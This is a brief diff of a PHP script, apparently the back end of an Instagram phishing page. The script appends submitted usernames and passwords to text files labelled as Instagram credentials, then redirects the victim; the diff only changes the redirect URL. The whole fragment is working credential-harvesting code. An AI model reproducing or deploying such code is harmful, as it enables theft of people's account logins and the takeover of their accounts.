@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Instagram Username : " . $email = $_POST['us
 ?>
 <?php
 file_put_contents("pass.txt", "Instagram Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
